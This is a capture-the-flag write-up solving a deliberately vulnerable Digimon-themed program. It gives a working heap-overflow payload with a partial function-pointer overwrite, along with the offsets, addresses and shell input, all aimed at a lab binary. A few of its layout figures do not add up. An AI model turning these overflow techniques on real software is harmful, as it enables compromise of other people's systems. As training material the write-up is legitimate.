# Digimon Digital Adventure - Solution Guide

## Challenge Summary

**Name:** Digimon Digital Adventure
**Category:** Binary Exploitation / Pwn
**Vulnerability:** Heap Buffer Overflow + Function Pointer Hijacking
**Difficulty:** Medium

## Quick Solution

### Method 1: Automated (Recommended)

```bash
python3 solution.py | ./digimon
```

### Method 2: Save and Run

```bash
python3 solution.py > exploit_input.txt
./digimon < exploit_input.txt
```

### Method 3: Remote Exploitation

```bash
python3 solution.py | nc <server> <port>
```

---

## How It Works

### 1. **The Vulnerability**

Located at [digimon.c:356](digimon.c#L356):

```c
// VULNERABILITY: No bounds checking during digivolution rename!
strcpy(digimon->name, input);
```

During digivolution, the program uses `strcpy()` without bounds checking, allowing heap overflow.

### 2. **Heap Memory Layout**

```
┌─────────────────────────────────────────┐
│ DigimonData (malloc #1)                 │
├─────────────────────────────────────────┤
│ name[64]                   (64 bytes)   │ ← Overflow starts here
│ power_level                (4 bytes)    │
│ experience                 (4 bytes)    │
│ evolution_stage            (4 bytes)    │
│ padding (alignment)        (4 bytes)    │
├─────────────────────────────────────────┤
│ Heap Metadata              (20 bytes)   │
├─────────────────────────────────────────┤
│ BattleSystem (malloc #2)                │
├─────────────────────────────────────────┤
│ battle_function* (TARGET)  (8 bytes)    │ ← 96 bytes from name[0]
│ evolution_stage            (4 bytes)    │
│ digital_signature[16]      (16 bytes)   │
└─────────────────────────────────────────┘
```

**Total offset:** 96 bytes from `name[0]` to `battle_function` pointer

### 3. **The Exploit**

#### Function Addresses:
- `agumon_greets()`: `0x40144b` (original)
- `wargreymon_appears()`: `0x401316` (target)

#### Payload Structure:
```python
payload = b"A" * 96                      # Fill to function pointer
payload += struct.pack('<Q', 0x401316)   # Overwrite with target address
```

#### The Trick: Partial Overwrite

`strcpy()` stops at null bytes (`\x00`):
- Target address: `0x401316` = `\x16\x13\x40\x00\x00\x00\x00\x00`
- `strcpy()` copies: `\x16\x13\x40` then stops at `\x00`
- Original pointer: `0x40144b` = `\x4b\x14\x40\x00\x00\x00\x00\x00`
- After overflow: `\x16\x13\x40\x00\x00\x00\x00\x00` = `0x401316` ✓

**Only 3 bytes are overwritten, but that's exactly what we need!**

### 4. **Exploitation Steps**

1. **Name Digimon** (safe operation)
2. **Train 10 times** to reach 50+ experience
3. **Trigger Digivolution** (menu option 6 unlocks at 50+ exp)
4. **Send malicious payload** when prompted for new name
5. **Get WarGreymon + Flag!** 🚩

---

## Manual Exploitation

If you want to understand the process step-by-step:

### Step 1: Find Function Address

```bash
$ nm digimon | grep wargreymon_appears
0000000000401316 T wargreymon_appears
```

### Step 2: Calculate Offset

```bash
$ cat > test_offset.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>

struct DigimonData {
    char name[64];
    int power_level;
    int experience;
    int evolution_stage;
};

struct BattleSystem {
    void (*battle_function)();
    int evolution_stage;
    char digital_signature[16];
};

int main() {
    struct DigimonData *d = malloc(sizeof(struct DigimonData));
    struct BattleSystem *b = malloc(sizeof(struct BattleSystem));

    printf("Offset: %ld bytes\n",
           (char*)&b->battle_function - (char*)d->name);

    return 0;
}
EOF

$ gcc -o test_offset test_offset.c && ./test_offset
Offset: 96 bytes
```

### Step 3: Create Payload

```python
import struct

# 96 bytes padding + 8 bytes address
payload = b"A" * 96 + struct.pack('<Q', 0x401316)
```

### Step 4: Exploit

```bash
# Create input sequence
(
echo "1"              # Menu: Name
echo "Agumon"         # Initial name
echo ""               # Continue

# Train 10 times
for i in {1..10}; do
    echo "2"          # Menu: Train
    echo ""           # Continue
done

echo "6"              # Menu: Digivolve
python3 -c "import sys; sys.stdout.buffer.write(b'A'*96 + b'\x16\x13\x40\x00\x00\x00\x00\x00')"
echo ""
echo "5"              # Exit
) | ./digimon
```

---

## Expected Output

```
✨ DIGIVOLUTION SEQUENCE INITIATED! ✨
⚡ DIGIVOLUTION IN PROGRESS... ⚡

╔═══════════════════════════════════════════════════════════╗
║          ⚡⚡⚡ CRITICAL DIGIVOLUTION! ⚡⚡⚡              ║
║                                                           ║
║     Your Digimon has achieved the ultimate form...       ║
║                    ✧ WARGREYMON ✧                        ║
║                                                           ║
║    The legendary warrior of courage has been born!       ║
╚═══════════════════════════════════════════════════════════╝

[WarGreymon ASCII Art]

🏴 FLAG: flag{your_flag_here}

Congratulations, DigiDestined! You've mastered the Digital World!
```

---

## Learning Points

### Vulnerability Types
- ✅ Heap Buffer Overflow
- ✅ Function Pointer Hijacking
- ✅ Unsafe String Functions (`strcpy` vs `strncpy`)

### Exploitation Techniques
- ✅ Heap Memory Analysis
- ✅ Offset Calculation
- ✅ Partial Pointer Overwrite
- ✅ Working Around Null Byte Restrictions

### Tools Used
- **GDB** - Binary debugging
- **nm** - Symbol extraction
- **objdump** - Disassembly
- **Python** - Payload generation

---

## Troubleshooting

### Issue: "Greymon appears instead of WarGreymon"

**Cause:** Function pointer wasn't overwritten correctly

**Solution:**
- Verify offset is exactly 96 bytes
- Check target address: `nm digimon | grep wargreymon`
- Ensure payload is correctly formatted

### Issue: "Heap corruption / Segfault"

**Cause:** Payload too long or corrupting heap metadata

**Solution:**
- Keep payload to exactly 104 bytes total (96 + 8)
- Don't write beyond the function pointer

### Issue: "Can't trigger digivolve option"

**Cause:** Not enough experience

**Solution:**
- Train at least 5-7 times (random 5-15 exp each)
- Option 6 appears only when exp >= 50

---

## Files

- `solution.py` - Automated exploit script
- `digimon.c` - Source code (educational)
- `digimon` - Vulnerable binary
- `flag.txt` - The flag

---

**Flag Format:** `flag{...}`

Good luck, DigiDestined! 🚩
